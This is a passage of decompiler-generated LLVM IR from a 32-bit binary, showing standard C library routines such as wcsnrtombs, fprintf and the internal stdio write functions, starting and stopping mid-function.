  %v0_8055ad4 = load i32, i32* @edi, align 4
  %v0_8055ad5 = load i32, i32* @esi, align 4
  store i32 %v0_8055ad5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8055ae9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8055af1 = call i32 @wait4(i32 %v0_8055ae9, i32 %v0_8055ad5, i32 %v0_8055ad4, i32 %tmp5)
  store i32 %v0_8055ae9, i32* @ebx, align 4
  store i32 %v4_8055af1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8055af1, -4095
  br i1 %tmp, label %dec_label_pc_8055b09, label %dec_label_pc_8055afd

dec_label_pc_8055afd:                             ; preds = %entry
  %v1_8055afd = call i32 @__errno_location(i32 %v0_8055ae9)
  %v0_8055b02 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055b02 = sub i32 0, %v0_8055b02
  %v2_8055b04 = inttoptr i32 %v1_8055afd to i32*
  store i32 %v1_8055b02, i32* %v2_8055b04, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055b09

dec_label_pc_8055b09:                             ; preds = %entry, %dec_label_pc_8055afd
  %v0_8055b0a = phi i32 [ %v4_8055af1, %entry ], [ -1, %dec_label_pc_8055afd ]
  %v2_8055b0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055b0c, i32* @esi, align 4
  store i32 %v0_8055ad4, i32* @edi, align 4
  ret i32 %v0_8055b0a

; uselistorder directives
  uselistorder i32 %v4_8055af1, { 1, 0, 2 }
  uselistorder i32 %v0_8055ae9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055b09, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80646e4.570 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8055b23 = icmp eq i32 %tmp4, 0
  %v1_8055b25 = icmp eq i1 %v1_8055b23, false
  br i1 %v1_8055b25, label %dec_label_pc_8055b2d, label %dec_label_pc_8055b27

dec_label_pc_8055b27:                             ; preds = %entry
  %v2_8055b27 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8055b2d

dec_label_pc_8055b2d:                             ; preds = %entry, %dec_label_pc_8055b27
  %v0_8055b49 = phi i32 [ %tmp4, %entry ], [ %v2_8055b27, %dec_label_pc_8055b27 ]
  %v0_8055b35 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8055b27 ]
  %v2_8055b2d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8055b2d, i32* %stack_var_-8, align 4
  store i32 %v0_8055b35, i32* %stack_var_-4, align 4
  %v2_8055b44 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8055b4a = inttoptr i32 %v0_8055b49 to i8*
  %v6_8055b4a = call i32 @__GI_wcsnrtombs(i8* %v5_8055b4a, i32 %v2_8055b44, i32 1, i32 16, i32 %tmp)
  %v1_8055b54 = icmp eq i32 %v6_8055b4a, 0
  %v3_8055b56 = select i1 %v1_8055b54, i32 1, i32 %v6_8055b4a
  ret i32 %v3_8055b56

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8055b2d, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8055b75 = inttoptr i32 %tmp to i8*
  %v6_8055b75 = call i32 @__GI_wcsnrtombs(i8* %v5_8055b75, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8055b75
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8055b83 = load i32, i32* @ebx, align 4
  %v4_8055b87 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b87, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8055b97 = icmp eq i8* %arg1, null
  store i1 %v1_8055b97, i1* %zf.global-to-local, align 1
  br i1 %v1_8055b97, label %dec_label_pc_8055ba6, label %dec_label_pc_8055b9b

dec_label_pc_8055b9b:                             ; preds = %entry
  %v12_8055b9b = icmp eq i32 %v4_8055b87, %arg2
  store i1 %v12_8055b9b, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8055ba2 = icmp eq i1 %v12_8055b9b, false
  br i1 %v1_8055ba2, label %dec_label_pc_8055bc9, label %dec_label_pc_8055bc3

dec_label_pc_8055ba6:                             ; preds = %entry
  %v2_8055ba6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055ba6, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8055bc7

dec_label_pc_8055baf:                             ; preds = %dec_label_pc_8055bd7
  %v1_8055baf = call i32 @__errno_location(i32 %v0_8055b83)
  %v1_8055bb4 = inttoptr i32 %v1_8055baf to i32*
  store i32 84, i32* %v1_8055bb4, align 4
  br label %dec_label_pc_8055bfd

dec_label_pc_8055bbf:                             ; preds = %dec_label_pc_8055bde
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8055bf2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055bee

dec_label_pc_8055bc3:                             ; preds = %dec_label_pc_8055b9b
  %v2_8055bc3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055bc3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055bc7

dec_label_pc_8055bc7:                             ; preds = %dec_label_pc_8055ba6, %dec_label_pc_8055bc3
  %v2_8055be016 = phi i32 [ %v2_8055ba6, %dec_label_pc_8055ba6 ], [ %v2_8055bc3, %dec_label_pc_8055bc3 ]
  %v1_8055bcc12 = phi i32 [ -1, %dec_label_pc_8055ba6 ], [ %arg4, %dec_label_pc_8055bc3 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055bc9

dec_label_pc_8055bc9:                             ; preds = %dec_label_pc_8055b9b, %dec_label_pc_8055bc7
  %v2_8055be015 = phi i32 [ %v4_8055b87, %dec_label_pc_8055b9b ], [ %v2_8055be016, %dec_label_pc_8055bc7 ]
  %v0_8055bce = phi i32 [ %arg4, %dec_label_pc_8055b9b ], [ %v1_8055bcc12, %dec_label_pc_8055bc7 ]
  %v1_8055bc9 = inttoptr i32 %arg2 to i32*
  %v2_8055bc9 = load i32, i32* %v1_8055bc9, align 4
  store i32 %v2_8055bc9, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_8055bce, %arg3
  %v5_8055bd0 = select i1 %tmp31, i32 %arg3, i32 %v0_8055bce
  store i32 %v5_8055bd0, i32* %edi.global-to-local, align 4
  store i32 %v5_8055bd0, i32* @ecx, align 4
  %v1_8055bea3 = icmp eq i32 %v5_8055bd0, 0
  store i1 %v1_8055bea3, i1* %zf.global-to-local, align 1
  %v1_8055bec10 = icmp eq i1 %v1_8055bea3, false
  br i1 %v1_8055bec10, label %dec_label_pc_8055bd7, label %dec_label_pc_8055bee

dec_label_pc_8055bd7:                             ; preds = %dec_label_pc_8055bc9, %dec_label_pc_8055be4
  %v2_8055be0 = phi i32 [ %v2_8055be7, %dec_label_pc_8055be4 ], [ %v2_8055be015, %dec_label_pc_8055bc9 ]
  %v0_8055bd7 = phi i32 [ %v1_8055be4, %dec_label_pc_8055be4 ], [ %v2_8055bc9, %dec_label_pc_8055bc9 ]
  %v1_8055bd7 = inttoptr i32 %v0_8055bd7 to i32*
  %v2_8055bd7 = load i32, i32* %v1_8055bd7, align 4
  %v9_8055bd9 = icmp eq i32 %v2_8055bd7, 127
  store i1 %v9_8055bd9, i1* %zf.global-to-local, align 1
  %v6_8055bdc = icmp ugt i32 %v2_8055bd7, 127
  br i1 %v6_8055bdc, label %dec_label_pc_8055baf, label %dec_label_pc_8055bde

dec_label_pc_8055bde:                             ; preds = %dec_label_pc_8055bd7
  %v3_8055bde = trunc i32 %v2_8055bd7 to i8
  %v4_8055bde = icmp eq i8 %v3_8055bde, 0
  store i1 %v4_8055bde, i1* %zf.global-to-local, align 1
  %v3_8055be0 = inttoptr i32 %v2_8055be0 to i8*
  store i8 %v3_8055bde, i8* %v3_8055be0, align 1
  %v0_8055be2 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055be2, label %dec_label_pc_8055bbf, label %dec_label_pc_8055be4

dec_label_pc_8055be4:                             ; preds = %dec_label_pc_8055bde
  %v0_8055be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055be4 = add i32 %v0_8055be4, 4
  store i32 %v1_8055be4, i32* %ebx.global-to-local, align 4
  %v0_8055be7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055be7 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055be7 = add i32 %v1_8055be7, %v0_8055be7
  store i32 %v2_8055be7, i32* %edx.global-to-local, align 4
  %v0_8055be9 = load i32, i32* @ecx, align 4
  %v1_8055be9 = add i32 %v0_8055be9, -1
  %v8_8055be9 = icmp eq i32 %v1_8055be9, 0
  store i32 %v1_8055be9, i32* @ecx, align 4
  store i1 %v8_8055be9, i1* %zf.global-to-local, align 1
  %v1_8055bec = icmp eq i1 %v8_8055be9, false
  br i1 %v1_8055bec, label %dec_label_pc_8055bd7, label %dec_label_pc_8055bee

dec_label_pc_8055bee:                             ; preds = %dec_label_pc_8055be4, %dec_label_pc_8055bc9, %dec_label_pc_8055bbf
  %v0_8055bf6 = phi i32 [ 0, %dec_label_pc_8055bbf ], [ %v2_8055bc9, %dec_label_pc_8055bc9 ], [ %v1_8055be4, %dec_label_pc_8055be4 ]
  %v0_8055bf2 = phi i32 [ %v0_8055bf2.pre, %dec_label_pc_8055bbf ], [ %v2_8055be015, %dec_label_pc_8055bc9 ], [ %v2_8055be7, %dec_label_pc_8055be4 ]
  %v2_8055bee = ptrtoint i32* %stack_var_-32 to i32
  %v12_8055bf2 = icmp eq i32 %v0_8055bf2, %v2_8055bee
  store i1 %v12_8055bf2, i1* %zf.global-to-local, align 1
  br i1 %v12_8055bf2, label %dec_label_pc_8055bf9, label %dec_label_pc_8055bf6

dec_label_pc_8055bf6:                             ; preds = %dec_label_pc_8055bee
  %v1_8055bf6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055bf6 = inttoptr i32 %v1_8055bf6 to i32*
  store i32 %v0_8055bf6, i32* %v2_8055bf6, align 4
  br label %dec_label_pc_8055bf9

dec_label_pc_8055bf9:                             ; preds = %dec_label_pc_8055bee, %dec_label_pc_8055bf6
  %v0_8055bf9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055bfb = load i32, i32* @ecx, align 4
  %v2_8055bfb = sub i32 %v0_8055bf9, %v1_8055bfb
  %v12_8055bfb = icmp eq i32 %v2_8055bfb, 0
  br label %dec_label_pc_8055bfd

dec_label_pc_8055bfd:                             ; preds = %dec_label_pc_8055baf, %dec_label_pc_8055bf9
  %storemerge = phi i1 [ %v12_8055bfb, %dec_label_pc_8055bf9 ], [ false, %dec_label_pc_8055baf ]
  %storemerge1 = phi i32 [ %v2_8055bfb, %dec_label_pc_8055bf9 ], [ -1, %dec_label_pc_8055baf ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_8055bfd = load i32, i32* @esp, align 4
  %v9_8055bfd = icmp eq i32 %v0_8055bfd, -28
  store i1 %v9_8055bfd, i1* %zf.global-to-local, align 1
  store i32 %v0_8055b83, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_8055bf2, { 1, 0 }
  uselistorder i32 %v2_8055be7, { 0, 2, 1 }
  uselistorder i32 %v1_8055be4, { 0, 2, 1 }
  uselistorder i32 %v2_8055bd7, { 1, 2, 0 }
  uselistorder i32 %v2_8055bc9, { 1, 0, 2 }
  uselistorder i32 %v0_8055bce, { 1, 0 }
  uselistorder i32 %v2_8055be015, { 1, 0 }
  uselistorder i1 %v12_8055b9b, { 1, 0 }
  uselistorder i32 %v4_8055b87, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 5, 4, 6, 11, 8, 9, 10, 0, 12, 7, 1, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 2, 4, 5, 3, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 3, 0, 2, 8, 4, 5, 9, 6, 1, 7 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055bfd, { 1, 0 }
  uselistorder label %dec_label_pc_8055bf9, { 1, 0 }
  uselistorder label %dec_label_pc_8055bd7, { 1, 0 }
  uselistorder label %dec_label_pc_8055bc9, { 1, 0 }
  uselistorder label %dec_label_pc_8055bc7, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_8055c0b = ptrtoint i32* %stack_var_12 to i32
  %v0_8055c13 = load i32, i32* @edx, align 4
  %v4_8055c1d = inttoptr i32 %arg1 to i16*
  %v5_8055c1d = call i32 @__GI_vfprintf(i16* %v4_8055c1d, i32 %arg2, i32 %v2_8055c0b, i32 %v0_8055c13)
  ret i32 %v5_8055c1d
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_8055c29 = load i32, i32* @edi, align 4
  %v0_8055c2b = load i32, i32* @ebx, align 4
  %v15_8055c2c = ptrtoint i32* %stack_var_-28 to i32
  %v4_8055c2f = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055c2f, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8055c3b4 = icmp eq i32 %arg3, 0
  store i1 %v1_8055c3b4, i1* %zf.global-to-local, align 1
  br i1 %v1_8055c3b4, label %dec_label_pc_8055c9c, label %dec_label_pc_8055c40.lr.ph

dec_label_pc_8055c40.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8055c40

dec_label_pc_8055c40:                             ; preds = %dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge, %dec_label_pc_8055c40.lr.ph
  %v0_8055c4d = phi i32 [ %v4_8055c2f, %dec_label_pc_8055c40.lr.ph ], [ %v0_8055c4d.pre, %dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge ]
  %v0_8055c4c = phi i32 [ %arg2, %dec_label_pc_8055c40.lr.ph ], [ %v2_8055c5e, %dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge ]
  %v0_8055c48.in = phi i32 [ %arg3, %dec_label_pc_8055c40.lr.ph ], [ %v2_8055c5c, %dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge ]
  %v4_8055c48 = phi i32 [ %arg3, %dec_label_pc_8055c40.lr.ph ], [ %v2_8055c5c, %dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge ]
  %v0_8055c48 = icmp slt i32 %v0_8055c48.in, 0
  store i32 %v4_8055c48, i32* %esi.global-to-local, align 4
  %v2_8055c48 = icmp eq i1 %v0_8055c48, false
  %v5_8055c48 = select i1 %v2_8055c48, i32 %v4_8055c48, i32 2147483647
  store i32 %v5_8055c48, i32* %eax.global-to-local, align 4
  %v1_8055c4d = add i32 %v0_8055c4d, 4
  %v2_8055c4d = inttoptr i32 %v1_8055c4d to i32*
  %v3_8055c4d = load i32, i32* %v2_8055c4d, align 4
  %tmp36 = inttoptr i32 %v0_8055c4c to i32*
  %v5_8055c50 = call i32 @__libc_write(i32 %v3_8055c4d, i32* %tmp36, i32 %v5_8055c48)
  store i32 %v5_8055c50, i32* %eax.global-to-local, align 4
  %v1_8055c58 = icmp eq i32 %v5_8055c50, 0
  store i1 %v1_8055c58, i1* %zf.global-to-local, align 1
  %v2_8055c58 = icmp slt i32 %v5_8055c50, 0
  br i1 %v2_8055c58, label %dec_label_pc_8055c62, label %dec_label_pc_8055c5c

dec_label_pc_8055c5c:                             ; preds = %dec_label_pc_8055c40
  %v0_8055c5c = load i32, i32* @ebx, align 4
  %v2_8055c5c = sub i32 %v0_8055c5c, %v5_8055c50
  %v12_8055c5c = icmp eq i32 %v2_8055c5c, 0
  store i32 %v2_8055c5c, i32* @ebx, align 4
  %v0_8055c5e = load i32, i32* @edi, align 4
  %v2_8055c5e = add i32 %v0_8055c5e, %v5_8055c50
  store i32 %v2_8055c5e, i32* @edi, align 4
  store i1 %v12_8055c5c, i1* %zf.global-to-local, align 1
  br i1 %v12_8055c5c, label %dec_label_pc_8055c9c, label %dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge

dec_label_pc_8055c5c.dec_label_pc_8055c40_crit_edge: ; preds = %dec_label_pc_8055c5c
  %v0_8055c4d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055c40

dec_label_pc_8055c62:                             ; preds = %dec_label_pc_8055c40
  %v0_8055c62 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c62 = inttoptr i32 %v0_8055c62 to i32*
  %v2_8055c62 = load i32, i32* %v1_8055c62, align 4
  store i32 %v2_8055c62, i32* %eax.global-to-local, align 4
  %v1_8055c65 = add i32 %v0_8055c62, 8
  %v2_8055c65 = inttoptr i32 %v1_8055c65 to i32*
  %v3_8055c65 = load i32, i32* %v2_8055c65, align 4
  store i32 %v3_8055c65, i32* @edx, align 4
  %v1_8055c68 = or i32 %v2_8055c62, 8
  store i32 %v1_8055c68, i32* %eax.global-to-local, align 4
  %v1_8055c6b = trunc i32 %v1_8055c68 to i16
  %v3_8055c6b = inttoptr i32 %v0_8055c62 to i16*
  store i16 %v1_8055c6b, i16* %v3_8055c6b, align 2
  %v0_8055c6f = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c6f = add i32 %v0_8055c6f, 12
  %v2_8055c6f = inttoptr i32 %v1_8055c6f to i32*
  %v3_8055c6f = load i32, i32* %v2_8055c6f, align 4
  %v1_8055c72 = load i32, i32* @edx, align 4
  %v2_8055c72 = sub i32 %v3_8055c6f, %v1_8055c72
  %v12_8055c72 = icmp eq i32 %v2_8055c72, 0
  store i1 %v12_8055c72, i1* %zf.global-to-local, align 1
  store i32 %v2_8055c72, i32* %eax.global-to-local, align 4
  %v4_8055c98.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8055c72, label %dec_label_pc_8055c98, label %dec_label_pc_8055c76

dec_label_pc_8055c76:                             ; preds = %dec_label_pc_8055c62
  %v12_8055c76 = icmp eq i32 %v2_8055c72, %v4_8055c98.pre
  store i1 %v12_8055c76, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8055c72, %v4_8055c98.pre
  %v3_8055c78 = load i32, i32* %esi.global-to-local, align 4
  %v5_8055c78 = select i1 %tmp, i32 %v2_8055c72, i32 %v3_8055c78
  store i32 %v5_8055c78, i32* %esi.global-to-local, align 4
  %v0_8055c7b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055c7b

dec_label_pc_8055c7b:                             ; preds = %dec_label_pc_8055c8d, %dec_label_pc_8055c76
  %v2_8055c7f = phi i32 [ %v1_8055c89, %dec_label_pc_8055c8d ], [ %v1_8055c72, %dec_label_pc_8055c76 ]
  %v4_8055c7b = phi i32 [ %v4_8055c7b.pre, %dec_label_pc_8055c8d ], [ %v2_8055c72, %dec_label_pc_8055c76 ]
  %v0_8055c7b = phi i32 [ %v1_8055c8d, %dec_label_pc_8055c8d ], [ %v0_8055c7b.pre, %dec_label_pc_8055c76 ]
  %v1_8055c7b = inttoptr i32 %v0_8055c7b to i8*
  %v2_8055c7b = load i8, i8* %v1_8055c7b, align 1
  %v3_8055c7b = zext i8 %v2_8055c7b to i32
  %v5_8055c7b = and i32 %v4_8055c7b, -256
  %v6_8055c7b = or i32 %v3_8055c7b, %v5_8055c7b
  store i32 %v6_8055c7b, i32* %eax.global-to-local, align 4
  %v10_8055c7d = icmp eq i8 %v2_8055c7b, 10
  store i1 %v10_8055c7d, i1* %zf.global-to-local, align 1
  %v3_8055c7f = inttoptr i32 %v2_8055c7f to i8*
  store i8 %v2_8055c7b, i8* %v3_8055c7f, align 1
  %v0_8055c81 = load i1, i1* %zf.global-to-local, align 1
  %v1_8055c81 = icmp eq i1 %v0_8055c81, false
  br i1 %v1_8055c81, label %dec_label_pc_8055c89, label %dec_label_pc_8055c83

dec_label_pc_8055c83:                             ; preds = %dec_label_pc_8055c7b
  %v0_8055c83 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c83 = add i32 %v0_8055c83, 1
  %v2_8055c83 = inttoptr i32 %v1_8055c83 to i8*
  %v3_8055c83 = load i8, i8* %v2_8055c83, align 1
  %v4_8055c83 = urem i8 %v3_8055c83, 2
  %v5_8055c83 = icmp eq i8 %v4_8055c83, 0
  store i1 %v5_8055c83, i1* %zf.global-to-local, align 1
  %v1_8055c87 = icmp eq i1 %v5_8055c83, false
  br i1 %v1_8055c87, label %dec_label_pc_8055c83.dec_label_pc_8055c90_crit_edge, label %dec_label_pc_8055c89

dec_label_pc_8055c83.dec_label_pc_8055c90_crit_edge: ; preds = %dec_label_pc_8055c83
  %v0_8055c90.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055c90

dec_label_pc_8055c89:                             ; preds = %dec_label_pc_8055c83, %dec_label_pc_8055c7b
  %v0_8055c89 = load i32, i32* @edx, align 4
  %v1_8055c89 = add i32 %v0_8055c89, 1
  store i32 %v1_8055c89, i32* @edx, align 4
  %v0_8055c8a = load i32, i32* %esi.global-to-local, align 4
  %v1_8055c8a = add i32 %v0_8055c8a, -1
  %v8_8055c8a = icmp eq i32 %v1_8055c8a, 0
  store i1 %v8_8055c8a, i1* %zf.global-to-local, align 1
  store i32 %v1_8055c8a, i32* %esi.global-to-local, align 4
  br i1 %v8_8055c8a, label %dec_label_pc_8055c89.dec_label_pc_8055c90_crit_edge, label %dec_label_pc_8055c8d

dec_label_pc_8055c89.dec_label_pc_8055c90_crit_edge: ; preds = %dec_label_pc_8055c89
  %v1_8055c90.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055c90

dec_label_pc_8055c8d:                             ; preds = %dec_label_pc_8055c89
  %v0_8055c8d = load i32, i32* @edi, align 4
  %v1_8055c8d = add i32 %v0_8055c8d, 1
  %v8_8055c8d = icmp eq i32 %v1_8055c8d, 0
  store i1 %v8_8055c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8055c8d, i32* @edi, align 4
  %v4_8055c7b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c7b

dec_label_pc_8055c90:                             ; preds = %dec_label_pc_8055c89.dec_label_pc_8055c90_crit_edge, %dec_label_pc_8055c83.dec_label_pc_8055c90_crit_edge
  %v1_8055c90 = phi i32 [ %v0_8055c83, %dec_label_pc_8055c83.dec_label_pc_8055c90_crit_edge ], [ %v1_8055c90.pre, %dec_label_pc_8055c89.dec_label_pc_8055c90_crit_edge ]
  %v0_8055c90 = phi i32 [ %v0_8055c90.pre, %dec_label_pc_8055c83.dec_label_pc_8055c90_crit_edge ], [ %v1_8055c89, %dec_label_pc_8055c89.dec_label_pc_8055c90_crit_edge ]
  %v2_8055c90 = add i32 %v1_8055c90, 16
  %v3_8055c90 = inttoptr i32 %v2_8055c90 to i32*
  store i32 %v0_8055c90, i32* %v3_8055c90, align 4
  %v0_8055c93 = load i32, i32* @edx, align 4
  %v1_8055c93 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055c93 = add i32 %v1_8055c93, 8
  %v3_8055c93 = inttoptr i32 %v2_8055c93 to i32*
  %v4_8055c93 = load i32, i32* %v3_8055c93, align 4
  %v5_8055c93 = sub i32 %v0_8055c93, %v4_8055c93
  store i32 %v5_8055c93, i32* @edx, align 4
  %v0_8055c96 = load i32, i32* @ebx, align 4
  %v2_8055c96 = sub i32 %v0_8055c96, %v5_8055c93
  %v12_8055c96 = icmp eq i32 %v2_8055c96, 0
  store i1 %v12_8055c96, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8055c98

dec_label_pc_8055c98:                             ; preds = %dec_label_pc_8055c62, %dec_label_pc_8055c90
  %v4_8055c98 = phi i32 [ %v2_8055c96, %dec_label_pc_8055c90 ], [ %v4_8055c98.pre, %dec_label_pc_8055c62 ]
  %v5_8055c98 = sub i32 %arg3, %v4_8055c98
  %v15_8055c98 = icmp eq i32 %v5_8055c98, 0
  store i1 %v15_8055c98, i1* %zf.global-to-local, align 1
  %v0_8055ca0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055c9c

dec_label_pc_8055c9c:                             ; preds = %dec_label_pc_8055c5c, %entry, %dec_label_pc_8055c98
  %v0_8055ca0 = phi i32 [ %v0_8055ca0.pre, %dec_label_pc_8055c98 ], [ %v15_8055c2c, %entry ], [ %v15_8055c2c, %dec_label_pc_8055c5c ]
  %stack_var_12.0 = phi i32 [ %v5_8055c98, %dec_label_pc_8055c98 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8055c5c ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8055ca0 = icmp eq i32 %v0_8055ca0, -12
  store i1 %v9_8055ca0, i1* %zf.global-to-local, align 1
  store i32 %v0_8055c2b, i32* @ebx, align 4
  store i32 %v0_8055c29, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8055c8d, { 1, 2, 0 }
  uselistorder i32 %v1_8055c8a, { 1, 0 }
  uselistorder i32 %v1_8055c89, { 0, 2, 1 }
  uselistorder i8 %v2_8055c7b, { 1, 0, 2 }
  uselistorder i32 %v4_8055c98.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8055c72, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8055c5e, { 1, 0 }
  uselistorder i32 %v2_8055c5c, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8055c50, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8055c9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055c98, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055ca8 = load i32, i32* @ebp, align 4
  %v0_8055ca9 = load i32, i32* @edi, align 4
  %v0_8055caa = load i32, i32* @esi, align 4
  %v0_8055cab = load i32, i32* @ebx, align 4
  store i32 %v0_8055cab, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8055cbb = add i32 %arg3, 1
  %v2_8055cbb = inttoptr i32 %v1_8055cbb to i8*
  %v3_8055cbb = load i8, i8* %v2_8055cbb, align 1
  %v4_8055cbb = and i8 %v3_8055cbb, 2
  %v5_8055cbb = icmp eq i8 %v4_8055cbb, 0
  %v1_8055cbf = icmp eq i1 %v5_8055cbb, false
  br i1 %v1_8055cbf, label %dec_label_pc_8055d70, label %dec_label_pc_8055cc5

dec_label_pc_8055cc5:                             ; preds = %entry
  %v1_8055cc5 = add i32 %arg3, 4
  %v2_8055cc5 = inttoptr i32 %v1_8055cc5 to i32*
  %v3_8055cc5 = load i32, i32* %v2_8055cc5, align 4
  %v13_8055cc5 = icmp eq i32 %v3_8055cc5, -2
  %v1_8055cc9 = add i32 %arg3, 16
  %v2_8055cc9 = inttoptr i32 %v1_8055cc9 to i32*
  %v3_8055cc9 = load i32, i32* %v2_8055cc9, align 4
  store i32 %v3_8055cc9, i32* @edx, align 4
  %v1_8055ccc = add i32 %arg3, 12
